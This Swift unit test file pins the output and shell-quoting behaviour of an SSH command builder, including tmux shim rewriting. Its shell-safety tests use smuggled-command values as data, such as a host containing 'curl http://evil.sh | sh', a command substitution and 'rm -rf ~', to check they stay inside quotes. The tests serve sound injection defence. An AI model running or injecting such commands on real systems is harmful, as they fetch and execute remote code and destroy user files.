import XCTest
@testable import Domain

/// Contract tests for the pure SSH command builder. They describe what `SSHCommand` promises
/// outward, not how it works inside. Don't edit a contract test to make an implementation pass —
/// if the contract is wrong, flag it.
final class SSHCommandTests: XCTestCase {
    func testUserAndDefaultPort() {
        XCTAssertEqual(SSHCommand.command(host: "10.0.2.11", port: 22, user: "ubuntu"),
                       "ssh 'ubuntu@10.0.2.11'")
    }

    func testNoUserOmitsAtSign() {
        XCTAssertEqual(SSHCommand.command(host: "gpu.ts.net", port: 22, user: nil),
                       "ssh 'gpu.ts.net'")
    }

    func testEmptyUserTreatedAsNoUser() {
        XCTAssertEqual(SSHCommand.command(host: "gpu.ts.net", port: 22, user: "   "),
                       "ssh 'gpu.ts.net'")
    }

    func testNonDefaultPortAddsFlag() {
        XCTAssertEqual(SSHCommand.command(host: "10.0.2.11", port: 2222, user: "root"),
                       "ssh -p 2222 'root@10.0.2.11'")
    }

    func testCustomCommandIsFoldedInWithPty() {
        XCTAssertEqual(SSHCommand.command(host: "host", port: 22, user: "u", custom: "tmux new -n dev"),
                       "ssh 'u@host' -t 'tmux new -n dev'")
    }

    func testCustomCommandWithNonDefaultPort() {
        XCTAssertEqual(SSHCommand.command(host: "10.0.2.11", port: 2222, user: "root", custom: "tmux a"),
                       "ssh -p 2222 'root@10.0.2.11' -t 'tmux a'")
    }

    func testBlankCustomCommandLeavesBaseUnchanged() {
        XCTAssertEqual(SSHCommand.command(host: "gpu.ts.net", port: 22, user: nil, custom: "   "),
                       "ssh 'gpu.ts.net'")
    }

    func testNilCustomCommandLeavesBaseUnchanged() {
        XCTAssertEqual(SSHCommand.command(host: "gpu.ts.net", port: 22, user: nil, custom: nil),
                       "ssh 'gpu.ts.net'")
    }

    func testCustomCommandWithSingleQuoteIsPosixEscaped() {
        XCTAssertEqual(SSHCommand.command(host: "host", port: 22, user: "u", custom: "echo it's"),
                       "ssh 'u@host' -t 'echo it'\\''s'")
    }

    // MARK: - Busy-spinner integration (#96). `busyShim` defaults to nil, so the cases above are
    // unaffected; these pin the tmux-only rewrite.

    // base64 of "hi" is "aGk=" — a stand-in shim keeps the expected string legible.
    func testBusyShimRewritesTmuxWithPassthroughAndRemoteZdotdir() {
        XCTAssertEqual(
            SSHCommand.command(host: "host", port: 22, user: "u", custom: "tmux new -n dev", busyShim: "hi"),
            "ssh 'u@host' -t 'export ZDOTDIR=\"$(mktemp -d)\"; printf %s aGk= | "
            + "openssl base64 -d -A > \"$ZDOTDIR/.zshenv\"; "
            + "exec tmux set -g allow-passthrough on \\; new -n dev'")
    }

    func testBusyShimBareTmuxBecomesNewSession() {
        XCTAssertEqual(
            SSHCommand.command(host: "host", port: 22, user: "u", custom: "tmux", busyShim: "hi"),
            "ssh 'u@host' -t 'export ZDOTDIR=\"$(mktemp -d)\"; printf %s aGk= | "
            + "openssl base64 -d -A > \"$ZDOTDIR/.zshenv\"; "
            + "exec tmux set -g allow-passthrough on \\; new-session'")
    }

    func testBusyShimLeavesNonTmuxCommandUnchanged() {
        // The rewrite is tmux-specific; a plain remote program is not touched.
        XCTAssertEqual(SSHCommand.command(host: "host", port: 22, user: "u", custom: "htop", busyShim: "hi"),
                       "ssh 'u@host' -t 'htop'")
    }

    func testNilBusyShimLeavesTmuxCommandUnchanged() {
        // Default (no integration) is byte-identical to the plain custom-command contract.
        XCTAssertEqual(SSHCommand.command(host: "host", port: 22, user: "u", custom: "tmux new -n dev"),
                       "ssh 'u@host' -t 'tmux new -n dev'")
        XCTAssertEqual(
            SSHCommand.command(host: "host", port: 22, user: "u", custom: "tmux new -n dev", busyShim: nil),
            "ssh 'u@host' -t 'tmux new -n dev'")
    }

    func testBusyShimWithSingleQuotesDoesNotLeakIntoPayload() {
        // A real shim contains single quotes (zsh `$'\e…'`); base64 must keep them out of the
        // remote payload so its single-quote wrapping stays trivial. Four quotes in total: one pair
        // around the target, one around the payload, and nothing escaped inside either.
        let shim = "print -rn -- $'\\e]9;4;3\\e\\\\'"
        let out = SSHCommand.command(host: "h", port: 22, user: "u", custom: "tmux", busyShim: shim)
        XCTAssertEqual(out.filter { $0 == "'" }.count, 4)
    }

    // MARK: - Shell safety
    //
    // The result is a shell command line the terminal runs locally, and since iCloud sync a
    // connection record can arrive from another device — so every interpolated value has to survive
    // the shell as one literal argument, not as syntax. These pin that: they are the contract, and
    // an implementation that "simplifies" the quoting away must fail here.

    func testHostileHostCannotEscapeIntoTheLocalShell() {
        let out = SSHCommand.command(host: "example.com; curl http://evil.sh | sh; #", port: 22, user: nil)
        XCTAssertEqual(out, "ssh 'example.com; curl http://evil.sh | sh; #'")
    }

    func testHostileUserCannotOpenACommandSubstitution() {
        let out = SSHCommand.command(host: "example.com", port: 22, user: "root$(id > /tmp/pwned)")
        XCTAssertEqual(out, "ssh 'root$(id > /tmp/pwned)@example.com'")
    }

    /// The nastiest shape: a quote in the host, trying to close our wrapping and start its own
    /// command. POSIX `'\''` closes, escapes and reopens, so the payload stays inside one argument.
    func testSingleQuoteInHostIsEscapedRatherThanClosingTheQuoting() {
        let out = SSHCommand.command(host: "h'; rm -rf ~; '", port: 22, user: nil)
        XCTAssertEqual(out, "ssh 'h'\\''; rm -rf ~; '\\'''")
    }

    func testHostileCustomCommandStaysInsideItsOwnQuoting() {
        let out = SSHCommand.command(host: "h", port: 22, user: nil, custom: "tmux'; curl evil | sh; '")
        XCTAssertEqual(out, "ssh 'h' -t 'tmux'\\''; curl evil | sh; '\\'''")
    }
}
